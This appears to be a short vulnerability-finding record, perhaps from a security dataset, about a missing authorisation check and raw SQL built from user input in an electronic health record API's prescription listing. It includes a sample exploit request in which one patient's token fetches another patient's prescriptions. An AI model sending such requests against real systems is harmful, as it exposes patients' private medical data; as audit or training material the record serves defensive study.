diagnosis: The ListPrescriptions method formats a raw SQL SELECT query targeting prescriptions matching requestedPatientID directly from user input. Because there is no check ensuring the caller is the patient or assigned physician, an attacker can enumerate any patient's medical prescription history.
exploit_request:
GET /ehr/prescriptions?patient_id=pat_99014 HTTP/1.1
Host: portal.healthrecord-cloud.org
Authorization: Bearer patient_token_102
Accept: application/json
